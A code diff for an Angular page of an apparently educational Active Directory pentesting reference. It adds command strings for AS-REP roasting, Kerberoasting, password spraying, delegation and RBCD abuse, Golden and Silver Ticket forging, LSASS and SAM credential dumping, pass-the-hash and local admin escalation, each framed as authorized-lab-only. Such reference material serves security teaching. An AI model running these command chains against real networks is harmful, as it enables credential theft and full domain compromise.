@@ -2,7 +2,7 @@
 import { Component, DestroyRef, OnInit, inject } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { MatExpansionModule } from '@angular/material/expansion';
-import { ActivatedRoute, Router } from '@angular/router';
+import { ActivatedRoute, Router, RouterLink } from '@angular/router';
 import { takeUntilDestroyed } from '@angular/core/rxjs-interop';
 import { Terminal } from '../../shared/terminal/terminal';
 import { SectionIndexComponent, SectionIndexItem } from '../../shared/components/section-index/section-index';
@@ -10,7 +10,7 @@ import { SectionIndexComponent, SectionIndexItem } from '../../shared/components
 @Component({
   selector: 'app-active-directory',
   standalone: true,
-  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent],
+  imports: [CommonModule, MatExpansionModule, Terminal, SectionIndexComponent, RouterLink],
   templateUrl: './active-directory.html',
   styleUrl: './active-directory.scss',
 })
@@ -31,9 +31,10 @@ export class ActiveDirectory implements OnInit {
     { id: 'kerberos', label: 'Kerberos Attacks', group: 'Attacking' },
     { id: 'passwords', label: 'Password Attacks', group: 'Attacking' },
     { id: 'compromise', label: 'Domain Compromise', group: 'Attacking' },
-    { id: 'planned-privesc', label: 'Privilege Escalation', group: 'Coming later', disabled: true },
-    { id: 'planned-post-exploitation', label: 'Post-Exploitation', group: 'Coming later', disabled: true }
+    { id: 'ad-example-three-host', label: 'Three-Host Domain Chain', group: 'Examples' },
+    { id: 'planned-privesc', label: 'Privilege Escalation', group: 'Coming later', disabled: true }
   ];
+  selectedFlowPhase = '';
   private readonly route = inject(ActivatedRoute);
   private readonly router = inject(Router);
   private readonly destroyRef = inject(DestroyRef);
@@ -46,6 +47,7 @@ export class ActiveDirectory implements OnInit {
         if (service && this.sections.some(item => item.id === service && !item.disabled)) {
           this.selectedService = service;
         }
+        this.selectedFlowPhase = params.get('phase') ?? '';
       });
   }
 
@@ -437,32 +439,138 @@ impacket-secretsdump -just-dc-user <username> <domain>/<user>@<dc-ip>
   // KERBEROS ATTACKS
   // =========================================================
 
-  attackAsrep = `
-# Kali: request AS-REP material for accounts without
-# Kerberos preauthentication (authorized lab)
-impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc-ip> -no-pass -format hashcat -outputfile asrep.txt
+  attackAsrep = String.raw`# AS-REP Roasting: accounts with DONT_REQ_PREAUTH only
+# Use only in an authorized lab; offline cracking does not contact the DC.
 
-# Offline audit with Hashcat
+# Windows: enumerate accounts with PowerView
+Import-Module .\PowerView.ps1
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+
+# Windows: request hashes with Rubeus
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+
+# Windows: target one known account
+Rubeus.exe asreproast /user:<USER> /domain:<DOMAIN> /dc:<DC_FQDN> /nowrap /outfile:asrep.txt
+
+# Kali: request hashes without credentials (requires a username list)
+impacket-GetNPUsers <DOMAIN>/ -dc-ip {{TARGET_IP}} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
+
+# Kali: request for an authenticated account
+impacket-GetNPUsers <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}} -request -format hashcat -outputfile asrep.txt
+
+# Offline audit: Hashcat mode 18200 is Kerberos 5 AS-REP etype 23
 hashcat -m 18200 asrep.txt /path/to/wordlist.txt
+hashcat -m 18200 asrep.txt --show
 
-# Windows: Rubeus
-.\\Rubeus.exe asreproast /nowrap
-
-# Only accounts configured without preauthentication
-# are susceptible to this technique.
+# Targeted lab demonstration: requires write rights on the user object.
+# XOR toggles the flag; run a second time to restore its previous state.
+Set-DomainObject -Identity <USER> -XOR @{useraccountcontrol=4194304} -Verbose
 `;
 
-  attackKerberoast = `
-# Kali: request service-ticket hashes for SPN accounts
-impacket-GetUserSPNs <domain>/<user> -dc-ip <dc-ip> -request -outputfile kerberoast.txt
+  attackKerberoast = String.raw`# Kerberoasting: request TGS material for accounts with SPNs
+# Request tickets only within the approved scope; crack them offline.
 
-# Offline audit (Hashcat mode depends on hash type)
+# Windows: enumerate SPN accounts with PowerView
+Import-Module .\PowerView.ps1
+Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
+
+# Windows: export hashes from PowerView for offline review
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation
+
+# Windows: collect hashes with Rubeus
+Rubeus.exe kerberoast /nowrap /outfile:kerberoast.txt
+Rubeus.exe kerberoast /user:<USER> /nowrap /outfile:kerberoast.txt
+
+# Kali: request TGS hashes with Impacket and authorized credentials
+impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}} -request -outputfile kerberoast.txt
+
+# Offline audit: mode 13100 is etype 23; mode 19700 is etype 17; mode 19600 is etype 18
 hashcat -m 13100 kerberoast.txt /path/to/wordlist.txt
+hashcat -m 13100 kerberoast.txt --show
 
-# Windows: Rubeus
-.\\Rubeus.exe kerberoast /outfile:kerberoast.txt
+# Prioritize weak service-account passwords and excessive privileges.
+# Ticket encryption depends on the account and domain configuration.
+`;
 
-# Review account privilege, SPN ownership and password strength.
+  attackKerbrute = String.raw`# Kerbrute: username enumeration and one-password assessment
+# Confirm authorization, lockout policy, scope and attempt limits first.
+# Stop on lockout indicators; do not spray production accounts.
+
+# Enumerate candidate usernames against the domain controller
+kerbrute userenum users.txt --dc {{TARGET_IP}} -d <DOMAIN>
+
+# Controlled lab only: test one approved password against an approved user list
+kerbrute passwordspray users.txt '<APPROVED_LAB_PASSWORD>' --dc {{TARGET_IP}} -d <DOMAIN>
+
+# Review authentication events and lockout status after the test.
+`;
+
+  attackDelegation = String.raw`# Delegation assessment: identify configured delegation and its scope
+# Validate findings only with approved lab accounts and systems.
+
+# Windows: enumerate unconstrained delegation on computers
+Get-DomainComputer -Unconstrained | Select-Object dnshostname
+
+# Windows: find users and computers trusted for protocol transition
+Get-DomainUser -TrustedToAuth | Select-Object samaccountname
+Get-DomainComputer -TrustedToAuth | Select-Object dnshostname
+
+# Windows: inspect allowed-to-delegate SPNs
+Get-DomainUser -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties samaccountname,msds-allowedtodelegateto
+Get-DomainComputer -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Properties dnshostname,msds-allowedtodelegateto
+
+# Unconstrained delegation: monitor only in a disposable lab session
+Rubeus.exe monitor /interval:5 /nowrap
+# Optional controlled coercion test, only against authorized lab hosts
+SpoolSample.exe <DC_FQDN> <LAB_HOST_FQDN>
+
+# Constrained delegation: request a ticket only for an allowed SPN
+Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<SERVICE_NTLM_HASH> /impersonateuser:<AUTHORIZED_TEST_USER> /msdsspn:<ALLOWED_SPN> /ptt
+
+# Kali: request a constrained-delegation service ticket with Impacket
+impacket-getST -spn <ALLOWED_SPN> -impersonate <AUTHORIZED_TEST_USER> <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}
+
+# Kali: summarize delegation using Impacket
+impacket-findDelegation <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}
+
+# User-based unconstrained delegation: lab-only overview
+# Requires a delegated test account, approved DNS/SPN changes and a controlled listener.
+python dnstool.py -u <DOMAIN>/<USER> -p '<PASSWORD>' -r <LAB_HOST_FQDN> -d {{LOCAL_IP}} --action add {{TARGET_IP}}
+python addspn.py -u <DOMAIN>/<USER> -p '<PASSWORD>' --target-type samname -t <DELEGATED_USER> -s CIFS/<LAB_HOST_FQDN> <DC_FQDN>
+sudo python krbrelayx.py -hashes :<DELEGATED_USER_NTLM_HASH>
+
+# Trigger only an approved lab authentication and monitor for tickets
+Rubeus.exe monitor /interval:5 /nowrap
+SpoolSample.exe <AUTHORIZED_LAB_HOST> <LAB_HOST_FQDN>
+
+# Review delegated SPNs, account privileges and relevant event logs.
+# Unconstrained delegation can expose cached tickets; do not export them outside the lab.
+`;
+
+  attackRbcd = String.raw`# Resource-Based Constrained Delegation (RBCD)
+# Requirement: authorized write rights over the target computer object's RBCD attribute.
+# Use a disposable lab account/computer and remove the ACL change after testing.
+
+# Windows: locate computer-object permissions with PowerView/BloodHound
+Get-DomainComputer -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity
+Get-ObjectAcl -Identity <TARGET_COMPUTER> -ResolveGUIDs
+
+# Kali: add a lab computer account if the domain policy permits it
+impacket-addcomputer <DOMAIN>/<USER>:'<PASSWORD>' -computer-name '<LAB_COMPUTER>$' -computer-pass '<LAB_MACHINE_PASSWORD>' -dc-host <DC_FQDN> -dc-ip {{TARGET_IP}}
+
+# Grant the lab computer delegation rights on the target (authorized lab only)
+impacket-rbcd -delegate-from '<LAB_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}
+
+# Request a service ticket for a lab service
+impacket-getST -spn cifs/<TARGET_FQDN> -impersonate <AUTHORIZED_TEST_USER> <DOMAIN>/'<LAB_COMPUTER>$':'<LAB_MACHINE_PASSWORD>' -dc-ip {{TARGET_IP}}
+
+# Use the ticket only against the authorized lab service
+export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
+impacket-psexec -k -no-pass <TARGET_FQDN>
+
+# Cleanup: remove the delegation entry and disposable computer account
+impacket-rbcd -delegate-from '<LAB_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action remove <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip {{TARGET_IP}}
+impacket-addcomputer <DOMAIN>/<USER>:'<PASSWORD>' -computer-name '<LAB_COMPUTER>$' -delete -dc-ip {{TARGET_IP}}
 `;
 
   attackTicketEnumeration = `
@@ -483,32 +591,66 @@ sekurlsa::tickets
 # Rubeus ticket operations require an authorized lab
 # and a valid ticket belonging to the test environment.
 
-# Inspect tickets
-klist
+# Create an isolated logon session for a controlled test
+Rubeus.exe createnetonly /program:cmd.exe /show
 
-# Rubeus ticket import syntax
+# Inspect tickets in the current session
+klist
+Rubeus.exe triage
+
+# Import a lab ticket into the selected session
 .\\Rubeus.exe ptt /ticket:<ticket-file.kirbi>
 
-# Verify the current session's ticket cache
+# Verify the ticket cache and access only the matching authorized service
 klist
+
+# Linux: convert a lab .kirbi ticket for Impacket, if needed
+impacket-ticketConverter <TICKET_FILE>.kirbi <TICKET_FILE>.ccache
+export KRB5CCNAME=./<TICKET_FILE>.ccache
+impacket-smbclient -k -no-pass <TARGET_FQDN>
 
 # A ticket does not automatically grant access to every host:
 # the service, identity, validity and permissions must match.
 `;
 
-  attackSilverTicket = `
-# Silver Ticket concepts
+  attackGoldenTicket = String.raw`# Golden Ticket: high-impact domain recovery / lab demonstration only
+# Requires the KRBTGT key, domain SID and an authorized domain test environment.
+# Treat generated tickets and keys as credentials; rotate KRBTGT twice after exposure.
 
-# A service ticket is forged using the target service account's
-# key material, plus domain and service-specific information.
+# Windows: forge and inject a lab ticket with Mimikatz
+mimikatz.exe
+kerberos::golden /domain:<DOMAIN> /user:<AUTHORIZED_TEST_USER> /sid:<DOMAIN_SID> /rc4:<KRBTGT_NTLM_HASH> /ptt
 
-# Assessment prerequisites:
-# - Authorized access to the relevant service-account key
-# - Correct domain SID and service SPN
-# - Understanding of service-side validation and privileges
+# Kali: create a ticket file with Impacket
+impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> <AUTHORIZED_TEST_USER>
+export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
+impacket-psexec -k -no-pass <DC_FQDN>
 
-# Validate exposure and remediate weak service-account passwords.
-# Avoid creating forged tickets outside a controlled lab.
+# Verify ticket metadata without using it outside the approved scope
+klist
+
+# Detection/remediation: audit ticket lifetimes and unusual identities;
+# rotate the KRBTGT secret twice with replication convergence between resets.
+`;
+
+  attackSilverTicket = String.raw`# Silver Ticket: service-specific ticket validation in an authorized lab
+# Requires the service/machine account key, domain SID, target SPN and test identity.
+# Unlike a Golden Ticket, scope is limited to the target service.
+
+# Kali: generate a service ticket for a lab SPN
+impacket-ticketer -nthash <SERVICE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<TARGET_FQDN> <AUTHORIZED_TEST_USER>
+
+# Export the ticket and verify its metadata; use only against the authorized service
+export KRB5CCNAME=./<AUTHORIZED_TEST_USER>.ccache
+klist
+impacket-smbclient -k -no-pass <TARGET_FQDN>
+
+# Windows tool alternative: build a test ticket with Mimikatz
+mimikatz.exe
+kerberos::golden /domain:<DOMAIN> /user:<AUTHORIZED_TEST_USER> /sid:<DOMAIN_SID> /rc4:<SERVICE_NTLM_HASH> /target:<TARGET_FQDN> /service:cifs /ptt
+
+# Detection: correlate service access with DC ticket-request logs and inspect unusual PACs.
+# Remediation: rotate the compromised service/machine account secret and review access.
 `;
 
   // =========================================================
@@ -569,16 +711,6 @@ nxc smb <target-ip> -d <domain> -u <username> -p '<lab-password>' --shares
 # Review authentication status, privileges and share permissions.
 `;
 
-  attackKerbrute = `
-# Kerbrute password spraying syntax for a controlled lab
-# Confirm lockout policy and test scope first.
-
-kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt '<lab-password>'
-
-# Stop if authentication errors or lockout indicators appear.
-# Prefer dedicated test accounts and an agreed attempt limit.
-`;
-
   // =========================================================
   // DOMAIN COMPROMISE
   // =========================================================
@@ -619,6 +751,72 @@ kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt '<lab-password>'
 5. Notify the system owner of critical credential exposure.
 6. Recommend credential rotation and least-privilege remediation.
 7. Remove temporary files and tools according to the engagement plan.
+`;
+
+  postExploitSituationalAwareness = `
+# Establish the current identity and machine context
+whoami /all
+hostname
+systeminfo
+ipconfig /all
+route print
+echo %USERDOMAIN%
+nltest /dsgetdc:<DOMAIN>
+
+# Map domain users, privileged groups and current sessions
+net user /domain
+net group "Domain Admins" /domain
+net group "Domain Computers" /domain
+query user
+qwinsta
+klist
+`;
+
+  postExploitCredentialRecovery = `
+# Remote LSASS collection requires authorized local administrator rights
+nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -M lsassy
+
+# Save local registry hives only from an elevated session
+reg save HKLM\\SAM C:\\Temp\\SAM
+reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM
+
+# Analyze collected local hives on Kali
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+
+# Treat recovered hashes, tickets and passwords as sensitive evidence.
+# Do not store credentials in source code or outside the engagement workspace.
+`;
+
+  postExploitCredentialRoutes = `
+# Password: validate access only against the approved target list
+nxc smb <TARGETS> -u <USER> -p '<PASSWORD>' --continue-on-success
+nxc winrm <TARGETS> -u <USER> -p '<PASSWORD>'
+
+# NTLM hash: use only where Pass-the-Hash is in scope
+nxc smb <TARGETS> -u <USER> -H <NTLM_HASH> --continue-on-success
+nxc winrm <TARGETS> -u <USER> -H <NTLM_HASH>
+
+# Remote execution requires sufficient administrative rights
+impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>
+impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<TARGET>
+
+# Kerberos ticket: verify the identity, service and expiry with klist;
+# continue with the Kerberos / Pass-the-Ticket section, not password spraying.
+`;
+
+  postExploitAdminGroupAccess = `
+# Optional: only if explicitly authorized to modify local group membership.
+# Run from an elevated Windows session; this changes the target host.
+net localgroup Administrators <USER> /add
+
+# Verify the resulting membership
+net localgroup Administrators
+
+# From Kali, reconnect using the approved account
+evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -p '<PASSWORD>'
+
+# If the approved credential is an NTLM hash instead of a password
+evil-winrm -i {{TARGET_IP}} -u '<DOMAIN>\\<USER>' -H <NTLM_HASH>
 `;
 
 
